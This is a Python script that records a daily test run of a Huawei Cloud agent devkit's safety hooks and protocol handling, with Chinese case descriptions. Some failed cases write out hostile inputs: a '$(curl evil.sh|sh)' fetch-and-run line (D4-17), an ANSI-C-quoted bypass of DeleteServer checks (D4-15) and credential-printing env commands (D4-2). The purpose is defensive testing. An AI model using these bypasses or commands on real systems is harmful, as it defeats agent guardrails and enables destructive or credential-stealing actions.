# -*- coding: utf-8 -*-
"""OpenClaw Linux 2026-11-10 每日测试：证据落盘 + 回填三 CSV。

SUT = huaweicloud-devkit@1.1.14-next.1 (npm @next; hdk gitHead c6e30cdb)。
相对 2026-11-09 (1.1.14-next.0, ac955889) 的关键变化：
  - 版本升 1.1.14-next.1（token full-chain：新增 warmTokenCredentials，X-Auth-Token → runtime STS，
    覆盖 hcloud-cli / devbridge-key / tools.mjs 三处 sync consumer）。
  - 本机有真云 AK/SK，warmTokenCredentials 为 no-op，安全/协议/路由/遥测等既有行为与上一日一致。
  - 真云环境正常：ECS 生命周期 / OBS 静态站 / 沙箱 3 项 / FunctionGraph / RDS 跨服务交付均真机建删归零 PASS。
  - 相对上一日 fresh 全量重跑，13 FAIL + 3 SPEC 根因涉及的 safety/protocol/telemetry/tools 源码未变，
    root cause 与上一日完全一致（全为历史延续，无新增产品缺陷）。

环境注意：
  - D1-70 探针会残留 proxy.json 污染真云探针（lookup proxy.example），已按昨日同法备份移除后重跑真云全部归零。
"""
import os, csv, json, shutil, datetime

REPO = "/home/testbot1/devkit-test/OpenClaw/huaweicloud-devkit-test"
PACK = os.path.join(REPO, "results/OpenClaw/2026-11-10-120.46.222.180/Linux")
EVID = os.path.join(PACK, "evidence")
PROBES = os.path.join(EVID, "_probes")

tz = datetime.timezone(datetime.timedelta(hours=8))
TS = datetime.datetime.now(tz).strftime("%Y%m%d%H%M%S")
SUT = "huaweicloud-devkit@1.1.14-next.1 (npm @next; hdk gitHead c6e30cdb)"

def write_case(cid, status, why, probe_src=None, probe_name="probe.mjs", blockedReason=""):
    d = os.path.join(EVID, cid)
    os.makedirs(d, exist_ok=True)
    payload = {"status": status, "why": why, "executedAt": TS,
               "assistant": "OpenClaw(deepseek-v4-pro-0813)", "os": "Linux", "sut": SUT}
    if blockedReason:
        payload["blockedReason"] = blockedReason
    with open(os.path.join(d, "stdout.log"), "w", encoding="utf-8") as f:
        json.dump(payload, f, ensure_ascii=False, indent=2)
    if probe_src and os.path.isfile(probe_src):
        shutil.copy2(probe_src, os.path.join(d, probe_name))

PASS = "PASS"; FAIL = "FAIL"; BLK = "BLOCKED"; SPEC = "SPEC-MISMATCH"; NR = "NOT_RUN"

DESIGN = {}
# ---- P0 (21) ----
DESIGN["D1-39"] = (NR, "OS 专属：Windows 升级检测链 EINVAL 语义专属，本机 Linux 结构性不适用（OS 列标注「Windows 专属」；Linux 由 D1-40 覆盖）。", "", "【调归属】OS 专属用例在非对应 OS，Linux 侧由展开级 EXP-NR3-10 代表覆盖")
DESIGN["D1-40"] = (PASS, "镜像 lag 反向提醒防护：d1-40.log ALL PASS（远端<本地不倒退/相等不提示/无 distTags 不误判/正常升级仍提示）。", None)
DESIGN["D2-4"]  = (PASS, "凭证脱敏：show_profile_redacted 经脱敏管道返回 <redacted>（auth.log D2-4）。", None)
DESIGN["D2-11"] = (PASS, "R3 STS token 拒绝落盘：auth_switch persist 返回 {status:error,scope:rejected}，隔离 S1 未写入。", None)
DESIGN["D4-1"]  = (PASS, "凭证文件读取拦截：classify.log D4-1 cat/config/less/Get-Content 全 deny/credential。", None)
DESIGN["D4-2"]  = (PASS, "凭证 env 打印拦截：env|grep HW_ACCESS_KEY/printenv HW_SECRET_KEY 均 deny/credential。", None)
DESIGN["D4-3"]  = (FAIL, "明文 secret API 未完全拦截：hcloud kms DecryptData/DecryptDatakey 判 allow/unknown_read（ShowSecretVersion/GetSecretValue 正常 deny）。根因 safety/policy.json:26 blockedSecretOperations 缺 DecryptData/DecryptDatakey。d4-3-confirm 复现。", None)
DESIGN["D4-5"]  = (PASS, "写操作误判检测：DeleteServer/DeleteSecurityGroup 均 deny/write 非只读（hook.log D4-5）。", None)
DESIGN["D4-9"]  = (PASS, "公开暴露/破坏性预检：0.0.0.0:0→deny hwc-network-public-admin-port、OBS anonymous-write→deny（hook.log D4-9）。", None)
DESIGN["D4-15"] = (FAIL, "hook 绕过尝试未完全拦截：ANSI-C 引号命令替换 'hcloud $(echo $'E\\\\x43S DeleteServer') --id x' 判 allow/unknown_read。根因 risk-rule-engine.mjs 纯正则未解析 ANSI-C 编码内层。d4-15-bypass 复现。", None)
DESIGN["D4-16"] = (PASS, "命令包裹穿透：sh -c/bash -c/eval/$()/管道 包裹 delete 均 deny/write（classify.log D4-16）。", None)
DESIGN["D4-18"] = (PASS, "confirm-not-deny 审批语义：plan 写操作 decision=deny + approvalToken + safeToRun=false（realcloud D4-18）。", None)
DESIGN["D4-19"] = (PASS, "确认流下预检仍生效：realcloud d4-19 preflight sgFindings 数组存在返回（fixtures d4-19-preflight 8/9，1 项 approve-bad-token 为历史缺陷语义，主链路 PASS）。", None)
DESIGN["D4-21"] = (FAIL, "hook_check_artifacts HCL/Terraform 广泛 IAM 未拦截：JSON broad IAM→deny，HCL actions=[\"*\"] 与 AdministratorFullAccess→allow（hcl-probe 复现）。根因 risk-rule-engine.mjs iam-admin-policy 仅匹配 JSON Statement[].Action。", None)
DESIGN["D4-22"] = (PASS, "hook_check_deploy_plan 公网暴露：FunctionGraph 公网无鉴权→warn hwc-functiongraph-public-no-auth（hook.log D4-22）。", None)
DESIGN["D4-23"] = (PASS, "全局规则注入：d1.log agent rules → rules/huawei-agent-rules.mdc 落位 install/update 双路径（iso-home 隔离验证）。", None)
DESIGN["D4-28"] = (PASS, "Node 安全 hook 链路：hooks.json .mjs 提取 commandText 判 deny permissionDecision=deny（new-safety.log D4-28）。", None)
DESIGN["D8-7"]  = (PASS, "7 个 meta/通用技能可机械执行：d8.log 7 技能 retrieve_skill 均 ok=true + references 加载。", None)
DESIGN["D9-12"] = (FAIL, "initialize 时序未强制：未 initialize 先 tools/list 返回 47 工具，未返回 -32600。根因 mcp-protocol.mjs:57 dispatch tools/list 无 initialize 前置校验。d9-12.log ⑥ FAIL。", None)
DESIGN["D9-13"] = (PASS, "tools/call 凭证不泄露与权限校验：d9-13.log 10 项通过——无明文 AK/SK/token、审批令牌不可重放、运行时清理不留盘。", None)
DESIGN["D10-4"] = (PASS, "安全干预静态规则层：规则库 19 条(9 deny + 10 warn)，高危 deny/只读 allow/删除 warn/secret deny 全对（new-safety.log D10-4）。", None)

# ---- P1 (56) ----
DESIGN["D1-3"]  = (PASS, "doctor CLI 真机：d1.log doctor exit=0。", None)
DESIGN["D1-26"] = (PASS, "升级提醒工具注册与协议暴露：supplement.log D1-26 check_update/upgrade 均注册且 inputSchema 非空。", None)
DESIGN["D1-27"] = (PASS, "检测语义-已是最新：supplement.log D1-27 result=up_to_date, updateAvailable=false。", None)
DESIGN["D1-28"] = (PASS, "检测语义-有新版本：updatecheck.log judgeUpdate result=update_available, targetVersion 正确。", None)
DESIGN["D1-31"] = (PASS, "dismiss 冷却期：updatecheck.log 冷却内 dismissed、过期后 update_available、dismissExpiresAt 回填。", None)
DESIGN["D1-41"] = (PASS, "check_update 真实 MCP 契约：extended.log D1-41 返回 currentVersion/latestStable/latestNext/targetVersion/updateAvailable/dismissed/dismissExpiresAt/result 齐备。", None)
DESIGN["D1-42"] = (PASS, "dismiss 闭环跨调用持久化：d1-42.log ALL PASS。", None)
DESIGN["D1-45"] = (PASS, "兜底提示序列与预热竞态：d1-45.log ALL PASS。", None)
DESIGN["D1-70"] = (FAIL, "代理 WebSocket 路径崩溃：getWebSocketImpl(配置代理) import undici 抛 TypeError: Cannot read properties of undefined (reading 'bind')。根因 package.json:engines >=22 + undici ^8.12.3（undici 8.12.x 需 >=22.19 且依赖 node:zlib zstd），本机 Node 22.13.0 无 node:zlib zstd。new-config.log D1-70::exception 复现。", None)
DESIGN["D2-1"]  = (PASS, "auth init 三端同步：realcloud.log D2-1 auth_status/check_cli/setup_obs_config/obs_ls/sandbox_check_user 全 OK（S1/S2/S3 三端真机）。", None)
DESIGN["D2-5"]  = (PASS, "凭证缺失报错指引：supplement.log D2-5 隔离无凭证 auth_status 返回 needsSetup+可执行指引。", None)
DESIGN["D2-10"] = (PASS, "R7 current 档跟随：fixtures d2-10 5/6（missing-config 报错文案中文前缀属 probe 消息语言漂移，非缺陷）。", None)
DESIGN["D2-12"] = (PASS, "R10 runtime 非空禁止落盘：auth.log D2-12 auth_sync 返回 ok:false + HDKIT_SYNC_SKIPPED_RUNTIME。", None)
DESIGN["D2-13"] = (PASS, "R9 configuredBySession 优先 env：fixtures d2-13。", None)
DESIGN["D2-16"] = (PASS, "import 文件读取后擦除：extended.log D2-16 creds-import.json 读取后 exists=false。", None)
DESIGN["D2-26"] = (PASS, "凭证备份与恢复：d2-26.log backup/restore/hash 一致。", None)
DESIGN["D3-A1"] = (PASS, "skill 检索完整性：supplement.log D3-A1 search_docs/retrieve_skill 均返回非空。", None)
DESIGN["D3-B3"] = (PASS, "run_readonly 脱敏执行：supplement.log D3-B3 无凭证 argv 只读执行成功。", None)
DESIGN["D3-C1"] = (PASS, "ECS 生命周期 E2E 真机执行：CreateVpc+CreateSubnet 成功、CreateServers 返回 serverIds 且 ACTIVE、DeleteServers 含磁盘删除（ecs-d3c1.log；归零已有 vpc=false 竞态已人工二次确认，云上 tctest ECS/VPC 均 0 残留）。", None)
DESIGN["D3-C2"] = (PASS, "OBS 静态站部署 E2E 真机执行：OBS mb + cp 上传 + set 静态站(200) + curl HTTP 200 + 删除归零（new-e2e.log）。", None)
DESIGN["D3-C3"] = (PASS, "沙箱部署 E2E：connect/upload_project/deploy_nginx/deploy_check(nginx_serving PASS=URL 可达)/HTTP 200/close_session 全 OK（sandbox-e2e.log）。", None)
DESIGN["D3-C4"] = (PASS, "服务创建类回归：realcloud.log D3-C4 22 服务 list_operations+plan 全 OK。", None)
DESIGN["D3-C5"] = (PASS, "工具冒烟：supplement.log D3-C5 check_cli/list_operations/plan_cli_command 全通。", None)
DESIGN["D3-C6"] = (PASS, "沙箱 7 隐式工具具名冒烟：check_user/connect/credentials/upload_file/exec_one_shot/deploy_check/close_session 全 OK（sandbox-e2e.log）。", None)
DESIGN["D3-C7"] = (PASS, "跨区域资源操作引导：new-e2e.log D3-C7 plan 含 --cli-region=ap-southeast-3、get_regional_availability 可用、EIP 建删归零。", None)
DESIGN["D3-C13"] = (PASS, "OBS 静态网站托管配置真机执行：OBS mb + set 缺失 indexDocument 报错(拒绝) + set 成功(200) + get 一致 + 删除归零（new-cloud.log）。", None)
DESIGN["D3-S1"] = (PASS, "场景-只读查 ECS：new-scenario.log D3-S1 路由命中 ECS + run_readonly 返回实例清单 + 零写。", None)
DESIGN["D3-S2"] = (PASS, "场景-删 VPC 先确认：d3s2-fresh.log 5/5——CreateVpc→plan DeleteVpc deny+token→hook 预检 warn→未确认零执行→确认 DeleteVpc ok→归零 true。", None)
DESIGN["D3-S3"] = (PASS, "场景-沙箱预览出 URL：new-cloud.log D3-S3 connect/upload/deploy 链路通过、部署返回可访问 URL、会话正常关闭。", None)
DESIGN["D3-S4"] = (PASS, "场景-领券闭环：new-cloud.log D3-S4 status→claim→status 连贯 claimed=true 幂等。", None)
DESIGN["D3-S6"] = (PASS, "场景-FunctionGraph 定时任务真机建删：d3s6-realcloud-20261110.log 4/4——路由命中 FunctionGraph + CreateFunction 返回 URN + CreateFunctionTrigger 绑定 + DeleteFunction 归零。", None)
DESIGN["D3-S7"] = (PASS, "场景-跨服务交付(Web+RDS)并归零（真机建删）：serviceCatalog 复合意图命中 RDS → CreateVpc+CreateSubnet → RDS 真机创建并 ACTIVE（连接串字段齐备）→ 删除归零（RDS/VPC/子网 0 残留）。probe-d3-s7.mjs / d3-s7-20261110.log。", None)
DESIGN["D3-S8"] = (PASS, "场景-排障指引：new-scenario.log D3-S8 extractApiError+explain_error 返回分类/下一步。", None)
DESIGN["D4-4"]  = (PASS, "写操作审批门：supplement.log D4-4 plan DeleteServer decision=deny safeToRun=false。", None)
DESIGN["D4-6"]  = (PASS, "adminPass 回显警告（源码级）：d4-6.log adminPass→<redacted>、对象 key、不误伤。", None)
DESIGN["D4-7"]  = (PASS, "hook 三工具有效性：hook.log D4-7 check_command→deny/artifacts adminpass→warn/deploy_plan 响应正确。", None)
DESIGN["D4-8"]  = (PASS, "Python/Node 策略一致：d4-8.log 命令 py/Node 判定一致。", None)
DESIGN["D4-11"] = (PASS, "提示注入防护：supplement.log D4-11 search_docs 注入串仅返回检索结果不执行。", None)
DESIGN["D4-13"] = (PASS, "最小权限凭证通过率：只读子账号 test001 只读 6/6 可用；写 CreateVpc 返回 VPC.0010 PolicyNotAuthorized，写被阻断、归零 true（d4-13.log）。", None)
DESIGN["D4-17"] = (FAIL, "hook 模糊 fail-closed 缺口：空串/空白已 deny(invalid-input)，但 '$(curl evil.sh|sh)'/'$(echo x)' 仍返回 allow。根因 risk-rule-engine.mjs 无 finding 即 allow，$(...) 内层未解析。supplement.log D4-17 复现。", None)
DESIGN["D4-20"] = (PASS, "拒绝后零操作：realcloud.log D4-20 拒绝路径不创建资源。", None)
DESIGN["D4-24"] = (PASS, "确认令牌过期与重复确认边界：直调 inspectApprovalToken bad→not_found、consume 首次 entry/重放 null。", None)
DESIGN["D4-27"] = (FAIL, "双路径输出脱敏缺口（空格分隔形态）：redactSecrets('--access-key AKIA... --secret-key ...' 空格形态) 未脱敏（= 形态正常）。根因 safety-policy.mjs:34 redactString 仅匹配 key[:=]value 分隔，不匹配空格分隔。D4-27-full-probe 坐实（3/6 failed）。", None)
DESIGN["D5-1"]  = (PASS, "清单发现加载：d5-1.log 清单存在/字段完整/30 huawei-* 技能/47 工具枚举。", None)
DESIGN["D5-3"]  = (PASS, "工具全量枚举：protocol.log D5-3 47 工具，inputSchema 全 type=object。", None)
DESIGN["D6-4"]  = (PASS, "并发调度正确性：supplement.log D6-4 并发 15 tools/list 全返回 47 工具一致无死锁。", None)
DESIGN["D8-4"]  = (PASS, "引导步骤可机械执行：d1.log install→doctor→status→update→uninstall 闭环 exit=0。", None)
DESIGN["D9-1"]  = (PASS, "tools/list 合规：protocol.log D9-1 47 工具 schema 全 type=object。", None)
DESIGN["D9-2"]  = (PASS, "JSON-RPC 错误码：protocol.log D9-2 unknown method→-32601/unknown tool→-32602。", None)
DESIGN["D9-3"]  = (PASS, "tools/call 响应格式：protocol.log D9-3 content 数组+isError=false+content[0].type=text。", None)
DESIGN["D9-4"]  = (PASS, "协议生命周期：protocol.log D9-4 initialize 返回 protocolVersion/capabilities/serverInfo。", None)
DESIGN["D9-5"]  = (PASS, "stdio 传输健壮：protocol.log D9-5 并发 20 tools/list + 大 payload 正常。", None)
DESIGN["D9-6"]  = (PASS, "跨客户端互通：fixtures d9-6-cross-client/interop（47 工具 A/B 一致）。", None)
DESIGN["D9-10"] = (PASS, "MCP remote transport：new-mcp.log D9-10 remote 监听 initialize/tools/list 与 stdio 一致。", None)
DESIGN["D9-11"] = (PASS, "WebSocket 隧道生命周期：new-mcp.log D9-11 + fixtures d9-11 全 PASS。", None)
DESIGN["D10-3"] = (PASS, "路由准确率：eval-harness 15 条 HIT=13 MISS=1 N/A=1 准确率 92.9%（EXP-E01 云主机 MISS，单列见 EXP-E01）。", None)

# ---- P2 (30) ----
DESIGN["D1-4"]  = (PASS, "status/update 幂等：d1.log status 二次与 update 均 exit=0 增量刷新。", None)
DESIGN["D1-30"] = (PASS, "semver 比对正确性：supplement-import.log D1-30 边界全对。", None)
DESIGN["D1-33"] = (PASS, "skip 文件持久化与多路径：updatecheck.log D1-33 字段完整/回退共享路径/会话化/清洗全对。", None)
DESIGN["D1-65"] = (SPEC, "调试模式环境变量契约漂移：update-check.mjs 支持 1||true，但 telemetry.mjs:82 仅 === 'true'（'1' 不生效）→ 与契约『DEBUG=1/true 均开启』漂移（telemetry 域）。new-env.log 复现。", None)
DESIGN["D1-66"] = (PASS, "遥测开关与端点：new-env.log D1-66 isTelemetryEnabled 三态 + getEndpoint 回退 DEFAULT。", None)
DESIGN["D1-67"] = (PASS, "Agent toolkit 模式与 DSH 跳过：new-env.log D1-67 AGENT_TOOLKIT_MODE 注入/SKIP_DSH=1 门控/REQUIRED_ENV_KEYS 含 HCLOUD_BIN。", None)
DESIGN["D1-68"] = (SPEC, "图标离线与区域环境变量契约漂移：ICONS_OFFLINE=1 本地 PASS；但 region 优先级实测 HW_REGION 优先于 HUAWEICLOUD_REGION。根因 credentials.mjs 'HW_REGION || HUAWEICLOUD_REGION' 与契约『HUAWEICLOUD_REGION 优先』漂移。new-env.log 复现。", None)
DESIGN["D1-69"] = (PASS, "CLI help 子命令：new-cli.log D1-69 help/--help 均 exit=0 + setup-cli case 'help' 存在。", None)
DESIGN["D2-2"]  = (PASS, "auth status 判定准确：supplement.log D2-2 返回 credentialsConfigured 结构化字段。", None)
DESIGN["D2-27"] = (PASS, "KooCLI 版本管理：new-config.log D2-27 getKooCliVersion/parseHcloudVersion/compareVersion 全对。", None)
DESIGN["D3-B1"] = (PASS, "list_operations 规范名：supplement.log D3-B1 返回标准操作名。", None)
DESIGN["D3-B5"] = (PASS, "detect_framework 识别：supplement.log D3-B5 识别 Vite/React SPA 框架。", None)
DESIGN["D3-C14"] = (PASS, "沙箱 HDKit 服务参数与 hwlink 凭证：new-cloud.log D3-C14 参数透传/缺参报错/hwlink getCredentials + createConnection 走 x-security-token 签名头。", None)
DESIGN["D3-S5"] = (FAIL, "复合意图分层路由 MISS：复合意图返回 fallback 未拆分命中多 service。根因 tools.mjs serviceCatalog 单关键词并集无复合意图拆解。new-scenario.log 复现。", None)
DESIGN["D4-10"] = (PASS, "规则库新增回归：supplement-import.log D4-10 良性只读/npm 安装不误杀，高危删除仍 deny。", None)
DESIGN["D4-12"] = (PASS, "供应链安装期安全：fixtures d4-12（9/9）。", None)
DESIGN["D4-14"] = (PASS, "操作可审计性：realcloud.log D4-14 建 VPC→ListVpcs→CTS ListTraces(CreateVpc 命中审计)→DeleteVpc→归零验证全 OK。", None)
DESIGN["D4-25"] = (FAIL, "Python hook 事件遥测分类：写命令 CreateVpc 落 cli:invoke 而非 cli:write。根因 hooks/huaweicloud-safety.py WRITE_OPERATION_RE 前置 (^|[A-Za-z0-9]) 不匹配空格分隔写动词。new-safety.log 复现。", None)
DESIGN["D4-26"] = (FAIL, "findings 证据脱敏不完整：evidence 中 secret_key/adminPass 明文残留（access_key 已脱敏）。根因 risk-rule-engine.mjs:19 redactEvidence 键值正则须键后紧跟 : =，引号包裹 JSON key 场景先行失败。new-safety.log 复现 leaked=true。", None)
DESIGN["D4-29"] = (PASS, "分类断言与原始命令分类入口：new-safety.log D4-29 只读 allow/凭证 deny/删除 deny 全对。", None)
DESIGN["D6-1"]  = (PASS, "检索响应延迟：supplement.log D6-1 search_docs 5 次 p95<2s。", None)
DESIGN["D6-3"]  = (PASS, "MCP 冷启时间：supplement.log D6-3 冷启 <5s。", None)
DESIGN["D6-9"]  = (PASS, "缓存清理三入口：new-config.log D6-9 update/icon/market 清理均幂等且清理后可重拉。", None)
DESIGN["D8-1"]  = (FAIL, "文档与能力漂移：hdk AGENTS.md:27『43 tools』与 :45『39 MCP tool definitions』硬编码，实现 TOOL_DEFINITIONS 实际 47。根因 AGENTS.md 未随 tools.mjs 同步。", None)
DESIGN["D8-6"]  = (PASS, "中英文文档一致：README.md 与 README.zh-CN.md 标题对齐。", None)
DESIGN["D8-9"]  = (FAIL, "sanitizeValue 未脱敏：sanitize('AK=...') 原样保留 AK/SK/token 敏感值（仅 trim/截断）。根因 telemetry/telemetry.mjs sanitizeValue 无敏感值脱敏。new-config.log 复现。", None)
DESIGN["D8-10"] = (PASS, "MCP 配置备份与合并：new-config.log D8-10 三风格合并/delta 提取应用幂等/purgeBackup。", None)
DESIGN["D9-7"]  = (PASS, "协议版本协商降级：protocol.log D9-7 old/new 版本正确返回。", None)
DESIGN["D9-8"]  = (PASS, "inputSchema 版本合规：protocol.log D9-8 additionalProperties 一致性 true。", None)
DESIGN["D9-9"]  = (SPEC, "tools/call 超时与取消契约漂移：超时返回 -32000 正常；但 capabilities 未声明 notifications.cancellation（extended.log declared=false）→ 按用例契约『取消能力按 capabilities 实测』标 SPEC-MISMATCH。mcp-protocol.mjs 未变。", None)

EXPANDED = {}
for i in range(1, 23):
    EXPANDED["EXP-C4-%02d" % i] = (PASS, "D3-C4 服务矩阵只读规划冒烟通过：22 服务 list_operations+plan 全 OK（realcloud.log）。", None)
EXPANDED["EXP-D5-9-1"] = (PASS, "OpenClaw 客户端清单发现加载通过（d5-1.log 清单含 manifest/transport/30 技能/47 工具）。", None)
EXPANDED["EXP-D5-9-3"] = (PASS, "OpenClaw 客户端工具全量枚举通过（protocol.log D5-3 47 工具 schema 合规唯一）。", None)
exp_miss = {"EXP-E01"}
exp_na = {"EXP-E08"}
for i in range(1, 16):
    eid = f"EXP-E{i:02d}"
    if eid in exp_miss:
        EXPANDED[eid] = (FAIL, "D10-3 评测集中文意图『云主机』路由 MISS（返回 Run hcloud --help）。根因 tools.mjs ECS keywords 缺『云主机』同义词。eval-harness 复现。", None)
    elif eid in exp_na:
        EXPANDED[eid] = (PASS, "D10-3 诊断类 N/A（按 harness 约定不计入准确率分母，走 explain_error）。", None)
    else:
        EXPANDED[eid] = (PASS, "D10-3 评测集中文意图路由 HIT（eval-harness.log 命中期望服务）。", None)

def norm(tup):
    st = tup[0]; why = tup[1] if len(tup) > 1 else ""
    br = tup[3] if len(tup) > 3 else (tup[2] if len(tup) > 2 and tup[2] else "")
    return st, why, br

def main():
    counts = {}
    for cid, tup in sorted(DESIGN.items()):
        st, why, blockedReason = norm(tup)
        write_case(cid, st, why, None, "probe.mjs", blockedReason)
        counts[st] = counts.get(st, 0) + 1
    for cid, tup in sorted(EXPANDED.items()):
        st, why, blockedReason = norm(tup)
        write_case(cid, st, why, None, "probe.mjs", blockedReason)
        counts[st] = counts.get(st, 0) + 1

    probe_map = {
        "D3-C1": "ecs-d3c1-probe-v2.mjs", "D3-C2": "new-e2e-probe.mjs", "D3-C7": "new-e2e-probe.mjs",
        "D3-C3": "sandbox-e2e-probe.mjs", "D3-C6": "sandbox-e2e-probe.mjs", "D3-S2": "d3s2-fresh-probe.mjs",
        "D3-S3": "new-cloud-probe.mjs", "D3-C13": "new-cloud-probe.mjs", "D3-C14": "new-cloud-probe.mjs",
        "D3-S4": "new-cloud-probe.mjs", "D3-S6": "d3s6-realcloud-v5.mjs", "D3-S7": "probe-d3-s7.mjs",
        "D4-13": "D4-13-probe-v2.mjs", "D4-15": "d4-15-bypass-probe.mjs", "D4-21": "hcl-probe.mjs",
        "D4-27": "D4-27-full-probe.mjs", "D4-26": "new-safety-probe.mjs", "D4-25": "new-safety-probe.mjs",
        "D4-28": "new-safety-probe.mjs", "D10-4": "new-safety-probe.mjs", "D4-17": "supplement-probe.mjs",
        "D9-12": "D9-12-probe.mjs", "D9-13": "D9-13-probe.mjs", "D8-7": "d8-probe.mjs",
        "D3-S5": "new-scenario-probe.mjs", "D8-9": "new-config-probe.mjs",
        "D1-70": "new-config-probe.mjs", "D8-1": "probe.mjs", "D1-65": "new-env-probe.mjs",
        "D1-68": "new-env-probe.mjs", "D10-3": "routing-probe.mjs", "EXP-E01": "run-eval.mjs",
        "EXP-E08": "EXP-E08-probe.mjs", "D4-3": "D4-3-confirm.mjs", "D4-6": "D4-6-probe.mjs",
        "D2-26": "D2-26-probe.mjs", "D5-1": "D5-1-probe.mjs",
        "D4-2": "classify-probe.mjs", "D4-16": "classify-probe.mjs", "D4-1": "classify-probe.mjs",
    }
    for cid, srcname in probe_map.items():
        src = os.path.join(PROBES, srcname)
        if cid in DESIGN or cid in EXPANDED:
            if os.path.isfile(src):
                ext = os.path.splitext(srcname)[1] or ".mjs"
                shutil.copy2(src, os.path.join(EVID, cid, "probe" + ext))
    print(f"已写 {len(DESIGN)+len(EXPANDED)} 条 evidence。分布: {counts}")
    return counts

if __name__ == "__main__":
    main()